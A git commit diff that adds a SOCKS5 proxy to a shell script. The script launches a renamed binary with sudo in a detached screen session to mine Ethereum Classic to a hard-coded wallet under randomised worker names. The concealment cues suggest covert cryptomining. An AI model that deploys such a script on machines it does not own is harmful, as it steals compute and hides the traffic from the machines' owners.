e2c0bde83d0f154ef5300098fee3736567fa2643
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-06-30 13:43:13 +0530

    Update okat.sh

--- okat.sh
+++ okat.sh
@@ -5,8 +5,9 @@ screen -dmS ls
 POOL=us-etc.2miners.com:1010
 WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
 WORKER=$(echo $(shuf -i 1-4 -n 1)-ARKIN)
+PROXY=socks5://174.64.199.79:4145
 
 cd "$(dirname "$0")"
 
-chmod +x ./erick && sudo ./erick -a etchash -o $POOL -u $WALLET.$WORKER -log
+chmod +x ./erick && sudo ./erick -a etchash -o $POOL -u $WALLET.$WORKER -x $PROXY -log
 pause $@
